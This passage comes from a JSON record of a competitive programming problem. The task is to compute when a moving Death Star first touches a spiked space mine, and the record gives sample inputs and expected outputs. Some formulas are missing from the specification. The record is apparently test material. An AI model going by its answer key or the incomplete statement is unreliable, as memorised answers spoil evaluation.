contains 3 integers pijx,pijy,pijz \u2014 the coordinates of the vector where the given spike is directed ().\nThe coordinates of the mines' centers and the center of the Death Star are integers, their absolute value does not exceed 10000. It is guaranteed that R>ri for any 1\u2264i\u2264n. For any mines i\u2260j the following inequality if fulfilled: . Initially the Death Star and the mines do not have common points.\n","output_spec":"If the rebels will succeed in stopping the Death Star using space mines, print the time from the moment the Death Star was noticed to the blast.\nIf the Death Star will not touch a mine, print \"-1\" (without quotes).\nFor the answer the absolute or relative error of 10^-6 is acceptable.\n","notes":null,"sample_inputs":["0 0 0 1 0 0 5\n2\n10 8 0 2 2\n0 -3 0\n2 2 0\n20 0 0 4 3\n2 4 0\n-4 3 0\n1 -5 0\n","8 8 4 4 4 2 6\n1\n-2 -2 -1 3 0\n","30 30 2 1 2 1 20\n3\n0 0 40 5 1\n1 4 4\n-10 -40 -5 7 0\n100 200 95 8 1\n-10 0 0\n"],"sample_outputs":["10.0000000000","-1","74.6757620881"]}
